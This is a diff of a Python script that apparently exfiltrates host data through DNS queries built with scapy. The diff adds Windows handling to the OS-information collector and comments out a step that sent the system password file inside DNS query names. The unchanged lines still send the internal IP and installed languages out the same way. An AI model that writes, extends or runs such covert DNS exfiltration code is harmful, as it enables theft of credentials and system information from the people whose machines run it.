@@ -61,12 +61,19 @@ def get_languages():
 
 def get_os_info():
     # Get the OS information using os.uname()
-    os_info = os.uname()
-    # Extract relevant information
-    os_name = os_info.sysname
-    os_version = os_info.version
-    os_release = os_info.release
-    os_data = os_name + "" + os_version + "" + os_release
+    if os.name == 'nt':
+        os_name = os.name
+        os_version = sys.getwindowsversion()
+
+        os_data = os.name + " " + str(os_version[0]) + "." + str(os_version[1]) + "." + str(os_version[2])
+
+    else:
+        os_info = os.uname()
+        # Extract relevant information
+        os_name = os_info.sysname
+        os_version = os_info.version
+        os_release = os_info.release
+        os_data = os_name + " " + os_version + " " + os_release
 
     return os_data
 
@@ -159,11 +166,11 @@ def query_packet():
     print("Internal IP sent")
 
     # Password file
-    dns.qd.qname = get_password_file()
-    dns_request = ip / udp / dns
-    send(dns_request)
-
-    print("Password file sent")
+    # dns.qd.qname = get_password_file()
+    # dns_request = ip / udp / dns
+    # send(dns_request)
+    #
+    # print("Password file sent")
 
     # Languages
     dns.qd.qname = get_languages()
